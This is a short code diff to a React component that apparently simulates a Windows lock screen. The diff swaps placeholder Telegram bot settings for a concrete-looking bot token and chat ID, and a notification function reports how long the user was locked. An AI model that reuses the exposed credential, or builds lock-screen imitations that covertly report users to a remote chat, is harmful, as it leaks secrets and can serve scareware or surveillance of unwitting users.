@@ -9,8 +9,8 @@ const WindowsLockSim: React.FC = () => {
   const [notificationSent, setNotificationSent] = useState(false);
 
   // Telegram bot configuration - REPLACE WITH YOUR OWN CREDENTIALS
-  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+  const TELEGRAM_BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
+  const TELEGRAM_CHAT_ID = '-1003737910762';
 
   // Function to send Telegram notification
   const sendTelegramNotification = async (message: string) => {
@@ -800,3 +800,4 @@ User was locked for ${Math.floor(performance.now() / 1000)} seconds
 };
 
 export default WindowsLockSim;
+
